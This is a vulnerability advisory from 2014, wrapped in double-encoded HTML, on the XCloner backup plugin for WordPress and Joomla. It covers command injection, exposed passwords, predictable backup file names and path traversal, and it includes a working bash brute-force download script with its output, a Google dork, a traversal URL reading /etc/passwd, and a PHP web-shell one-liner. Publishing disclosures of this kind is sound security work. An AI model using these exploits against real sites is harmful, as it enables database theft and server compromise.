@@ -1,0 +1,164 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 110&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; XCloner Backup Plugin v3.1.1 (Wordpress) v3.5.1 (Joomla!) Vulnerabilities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2014-10-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/xcloner-backup-and-restore/">https://wordpress.org/plugins/xcloner-backup-and-restore/</a> <a href="http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665">http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665</a>"&gt;<a href="https://wordpress.org/plugins/xcloner-backup-and-restore/">https://wordpress.org/plugins/xcloner-backup-and-restore/</a> <a href="http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="http://www.xcloner.com&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.xcloner.com&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2014-10-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; Ovidiu Liuta, @thinkovi Acknowledged &amp; no other response&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;There are multiple vulnerabilities I&amp;rsquo;ve discovered in this plugin, they are as follows.
+Arbitrary command execution:<br/>
+Clear text MySQL password exposure through html text box under configuration panel.
+Database backups exposed to local users due to open file permissions.
+Unauthenticated remote access to backup files via easily guessable file names.
+Authenticated remote file access.<br/>
+MySQL password exposed to process table:
+Arbitrary Command Execution<br/>
+Plugin allows arbitrary commands to be executed by an authenticated user.  The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields.
+</p><p>All user configurable variables are vulnerable, these variables need to be sanitized before being passed to the exec() function for execution.
+$_CONFIG[tarpath]<br/>
+$exclude<br/>
+$_CONFIG[&amp;#039;tarcompress&amp;#039;]<br/>
+$_CONFIG[&amp;#039;filename&amp;#039;]<br/>
+$<u>CONFIG[&amp;#039;exfile</u>tar&amp;#039;]<br/>
+$_CONFIG[sqldump]<br/>
+$<u>CONFIG[&amp;#039;mysql</u>host&amp;#039;]<br/>
+$<u>CONFIG[&amp;#039;mysql</u>pass&amp;#039;]<br/>
+$<u>CONFIG[&amp;#039;mysql</u>user&amp;#039;]<br/>
+$database_name<br/>
+$sqlfile<br/>
+$filename<br/>
+Vulnerable code  <br/>
+./cloner.functions.php:
+</p><pre>
+1672       exec($_CONFIG[tarpath] . &amp;quot; $exclude -c&amp;quot; . $_CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;vf $filename ./administrator/backups/index.html&amp;quot;);
+1673       exec($_CONFIG[tarpath] . &amp;quot; -&amp;quot; . $_CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;vf $filename --update ./administrator/backups/database-sql.sql&amp;quot;);
+1674       exec($_CONFIG[tarpath] . &amp;quot; -&amp;quot; . $_CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;vf $filename --update ./administrator/backups/htaccess.txt&amp;quot;);
+1675       exec($_CONFIG[tarpath] . &amp;quot; -&amp;quot; . $_CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;vf $filename --update ./administrator/backups/perm.txt&amp;quot;);
+1695-          if ($<u>REQUEST[cron</u>dbonly] != 1) {
+1696:              exec($<u>CONFIG[tarpath] . &amp;quot; $excl</u>cmd &amp;quot; . &amp;quot; -X &amp;quot; . $<u>CONFIG[&amp;#039;exfile</u>tar&amp;#039;] . &amp;quot;  -chv&amp;quot; . $_CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;f $filename ./&amp;quot;);
+1697-          } else {
+</pre>
+<p>1698-<br/>
+1699-<br/>
+1700:      exec($_CONFIG[tarpath] . &amp;quot;  -&amp;quot; . $<u>CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;cvf $filename ./administrator/backups/database-sql.sql&amp;quot;);
+1701-
+</p><pre>
+1702-              if (is</u>array($databases_incl)) {
+1703-                  foreach ($databases_incl as $database_name)
+1704-                      if ($database_name != &amp;quot;&amp;quot;) {
+1705:                          exec($_CONFIG[tarpath] . &amp;quot;  -&amp;quot; . $<u>CONFIG[&amp;#039;tarcompress&amp;#039;] . &amp;quot;vf $filename --update  ./administrator/backups/&amp;quot; . $database</u>name . &amp;quot;-sql.sql&amp;quot;);
+1706-                      }
+1707-              }
+1708-          }
+</pre>
+<p>--<br/>
+1873-  {
+</p><pre>
+1874-      //$sizeInBytes = filesize($path);
+1875-      $sizeInBytes = sprintf(&amp;quot;%u&amp;quot;, filesize($path));
+1876:      if ((!$sizeInBytes) and (function_exists(&amp;quot;exec&amp;quot;))){
+1877-          $command = &amp;quot;ls -l \&amp;quot;$path\&amp;quot; | cut -d \&amp;quot; \&amp;quot; -f 5&amp;quot;;
+1878:          $sizeInBytes = @exec($command);
+1879-      }
+2010-      if ($<u>CONFIG[&amp;#039;sql</u>mem&amp;#039;]) {
+2011:          exec($_CONFIG[sqldump] . &amp;quot; -h &amp;quot; . $<u>CONFIG[&amp;#039;mysql</u>host&amp;#039;] . &amp;quot; -u &amp;quot; . $<u>CONFIG[&amp;#039;mysql</u>user&amp;#039;] . &amp;quot; -p&amp;quot; . $<u>CONFIG[&amp;#039;mysql</u>pass&amp;#039;] . &amp;quot; &amp;quot; . $dbname . &amp;quot; &amp;gt; &amp;quot; . $sqlfile . &amp;quot; $drop --allow-k
+</pre>
+<p>eywords &amp;quot; . $ex_dump);<br/>
+2012-
+</p><pre>
+2013-          if (get_filesize($sqlfile) &amp;gt; 0)
+2014-              $databaseResult = LM_DATABASE_BACKUP_COMPLETED . &amp;#039; ( &amp;#039; . getFileSizeText(get_filesize($sqlfile)) . &amp;#039; )&amp;#039;;
+2015-          else
+2016-              $databaseResult = LM_MSG_BACK_14;
+2017-
+2018:          exec(&amp;quot;chmod 777 $sqlfile&amp;quot;);
+2019-
+2020-          return $sqlfile;
+2021-      }
+</pre>
+<p>./classes/fileRecursion.php<br/>
+339-    public static function getFileSize($file){
+340-
+</p><pre>
+341-      $sizeInBytes = sprintf(&amp;quot;%u&amp;quot;, filesize($file));
+342:      if ((!$sizeInBytes) and (function_exists(&amp;quot;exec&amp;quot;))){
+343-          $command = &amp;quot;ls -l \&amp;quot;$file\&amp;quot; | cut -d \&amp;quot; \&amp;quot; -f 5&amp;quot;;
+344:          $sizeInBytes = @exec($command);
+345-      }
+346-
+347-      return $sizeInBytes;
+</pre>
+<p>./restore/XCloner.php<br/>
+290-    }else{
+</p><pre>
+291-            if($ext == &amp;#039;.tgz&amp;#039;) $compress = &amp;#039;z&amp;#039;;
+292-            else $compress = &amp;#039;&amp;#039;;
+293:            shell_exec(&amp;quot;tar -x&amp;quot;.$compress.&amp;quot;pf $file -C $<u>CONFIG[output</u>path]&amp;quot;);
+</pre>
+<p>294-    }<br/>
+295-}<br/>
+1077-   if($<u>REQUEST[&amp;#039;use</u>mysqldump&amp;#039;] == 1){
+</p><pre>
+1078:           echo shell_exec($<u>REQUEST[&amp;#039;mysqldump</u>path&amp;#039;].&amp;quot; -u &amp;quot;.$<u>REQUEST[mysql</u>username].&amp;quot; -p&amp;quot;.$<u>REQUEST[mysql</u>pass].&amp;quot; -h &amp;quot;.$<u>REQUEST[mysql</u>server].&amp;quot; &amp;quot;.$<u>REQUEST[mysql</u>db].&amp;quot; &amp;lt; &amp;quot;.$sqlfile);
+1079-           return;
+</pre>
+<p>1080-    }<br/>
+Clear Text MySQL Database Password<br/>
+The plugin also returns the MySQL clear text password via html text box back to the user in the configuration panel.  A password should never be repeated back to you in clear text.  The plugin will happily send this over a clear text connection.
+</p><p>Remote Database Download &amp;amp; Local File Permissions
+The default recommend path for backup storage is /usr/share/wordpress/administrator/backups.
+An index.html file is created under this directory to prevent casual browsing however the file names are easily predictable. From the installation instructions:
+&amp;ldquo;XCloner is a tool that will help you manage your website backups, generate/restore/move so your website will be always secured! With XCloner you will be able to clone your site to any other location with just a few clicks. Don&amp;#039;t forget to create the &amp;#039;administrator/backups&amp;#039; directory in your Wordpress root and make it fully writeable.&amp;rdquo;
+The format of the filenames are: backup_year-month-day_month_24hour_minute_domainname-sql-OPTIONS.tar where
+OPTIONS could be either -sql-drop, -sql-nodrop or -nosql depending on options selected during time of backup.  
+The domain name is set by the HTTP_HOST header from line 88 of  <a href="ftp://cloner.config.php/88">cloner.config.php:88</a>
+: $<u>CONFIG[&amp;#039;mosConfig</u>live_site&amp;#039;]=$<u>SERVER[&amp;#039;HTTP</u>HOST&amp;#039;];
+root@larry:/usr/share/wordpress/administrator/backups<strong> ls -l
+total 129432<br/>
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:15 backup_2014-10-29_10-14_testsite-sql-nodrop.tar
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:19 backup_2014-10-29_10-19_testsite-sql-nodrop.tar
+-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:24 backup_2014-10-29_10-24_testsite-sql-nodrop.tar
+These file permissions also expose the contents of the databases to any local system users.
+File naming convention code is as follows:
+</p><pre>
+   1327       $domainname = $<u>CONFIG[&amp;</strong>039;mosConfig</u>live_site&amp;#039;];
+   1351       if ($_REQUEST[&amp;#039;bname&amp;#039;] == &amp;quot;&amp;quot;) {
+   1352           if ($backupDatabase == 1) {
+   1353               if ($<u>REQUEST[&amp;#039;dbbackup</u>drop&amp;#039;]) {
+   1354                   $filename1 = &amp;#039;backup_&amp;#039; . date(&amp;quot;Y-m-d_H-i&amp;quot;) . &amp;#039;<u>&amp;#039; . $domainname . &amp;#039;-sql-drop&amp;#039; . $f</u>ext;
+   1355               } else {
+   1356
+   1357                   $filename1 = &amp;#039;backup_&amp;#039; . date(&amp;quot;Y-m-d_H-i&amp;quot;) . &amp;#039;<u>&amp;#039; . $domainname . &amp;#039;-sql-nodrop&amp;#039; . $f</u>ext;
+   1358               }
+   1359           } else
+   1360               $filename1 = &amp;#039;backup_&amp;#039; . date(&amp;quot;Y-m-d_H-i&amp;quot;) . &amp;#039;<u>&amp;#039; . $domainname . &amp;#039;-nosql&amp;#039; . $f</u>ext;
+   1361       } else {</pre>
+<p>I&amp;rsquo;ve found a few vulnerable websites with the google dork:
+<a href="https://www.google.com/#q=inurl:+administrator%2Fbackups">https://www.google.com/#q=inurl:+administrator%2Fbackups</a>
+</p>
+<p>Remote File Access<br/>
+The user has to have administrative rights, but the backup downloader doesn&amp;rsquo;t check the path
+for ../.<br/>
+<a href="http://192.168.0.33/wp-admin/admin-ajax.php?action=json_return&amp;amp;page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=download&amp;amp;file=../../../../etc/passwd">http://192.168.0.33/wp-admin/admin-ajax.php?action=json_return&amp;amp;page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=download&amp;amp;file=../../../../etc/passwd</a>
+Will download /etc/passwd off the remote system.
+MySQL Database Password Exposed to Process Table
+lwc@wordpress:/etc/wordpress$ while (true); do ps -ef |grep [m]ysqldump; done
+</p><pre>
+www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -pPASSWORDHERE wordpress &amp;gt; /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords
+www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords
+www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -ps3cur1ty wordpress &amp;gt; /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords
+www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords
+&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2014-8603 2014-8604 2014-8605 2014-8606 2014-8607&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=110"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;All input fields I believe are vulnerable, I&acirc;€<sup>TM</sup>ve chosen the backup filename and a wget of sh.txt which is simply &lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt; &lt;a href="<a href="http://www.php.net/passthru">http://www.php.net/passthru</a>"&gt;&lt;span style="color: #990000;"&gt;passthru&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$_GET&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt; into a writeable directory by www-data.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;<strong>!/bin/bash&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;</strong>Exploit to download XCloner v3.1.1 Database backups&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;<strong>Larry W. Cashdollar, @_larry0&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;</strong>XCloner recommends a backup storage path under the WP root directory&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;<strong>it uses a 0 size index.html file to block indexing.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;</strong>we can try to brute force the filenames it creates.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;MONTH=10&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;DAY=30&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;#May need to set the DOMAIN to $1 the target depending on how WP is configured.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;DOMAIN=&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;for y in `seq -w 1 24`; do&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        for x in `seq -w 1 59`; do&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                CPATH=&amp;quot;<a href="http://">http://</a>$1/administrator/backups/backup_2014-&amp;quot;$MONTH&amp;quot;-&amp;quot;$DAY&amp;quot;<u>&amp;quot;$y&amp;quot;-&amp;quot;$x&amp;quot;</u>$DOMAIN-sql-nodrop.tar&amp;quot;;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 RESULT=`curl -s --head $CPATH|grep 200`;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                if [ -n &amp;quot;$RESULT&amp;quot; ]; then&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 echo &amp;quot;[+] Location $CPATH Found&amp;quot;;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 echo &amp;quot;[+] Received $RESULT&amp;quot;;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 echo &amp;quot;Downloading......&amp;quot;;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 wget $CPATH&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                fi;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        done&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;done&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;lwc@wordpress:~$ bash exp.sh <a href="telnet://192.168.0.26">192.168.0.26</a>&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;[+] Location <a href="http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar">http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar</a> Found&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;[+] Received HTTP/1.1 200 OK&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Downloading......&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;--2014-10-30 13:02:51--  <a href="http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar&lt;/div&gt;&lt;/li&gt;&lt;li">http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Connecting to <a href="ftp://192.168.0.26/80...">192.168.0.26:80...</a> connected.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;HTTP request sent, awaiting response... 200 OK&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Length: 44400640 (42M) [application/x-tar]&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Saving to: `backup_2014-10-30_06-27_-sql-nodrop.tar.1'&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;100%[========================================&amp;gt;] 44,400,640  56.9M/s   in 0.7s    &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;2014-10-30 13:02:52 (56.9 MB/s) - `backup_2014-10-30_06-27_-sql-nodrop.tar.1' saved [44400640/44400640]&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;[+] Location <a href="http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar">http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar</a> Found&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;[+] Received HTTP/1.1 200 OK&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Downloading......&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;--2014-10-30 13:02:52--  <a href="http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar&lt;/div&gt;&lt;/li&gt;&lt;li">http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Connecting to <a href="ftp://192.168.0.26/80...">192.168.0.26:80...</a> connected.&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;HTTP request sent, awaiting response... 200 OK&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Length: 44400640 (42M) [application/x-tar]&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Saving to: `backup_2014-10-30_06-33_-sql-nodrop.tar.1'&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;100%[========================================&amp;gt;] 44,400,640  64.1M/s   in 0.7s    &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;2014-10-30 13:02:53 (64.1 MB/s) - `backup_2014-10-30_06-33_-sql-nodrop.tar.1' saved [44400640/44400640]&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; [&lt;a href="/m/image03.png"&gt;image03.png&lt;/a&gt;][&lt;a href="/m/image01.png"&gt;image01.png&lt;/a&gt;][&lt;a href="/m/image02.png"&gt;image02.png&lt;/a&gt;][&lt;a href="/m/image00.png"&gt;image00.png&lt;/a&gt;]&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/">http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+</pre>
+<p>&lt;/html&gt;
+</p>
+
+</body>
+</html>
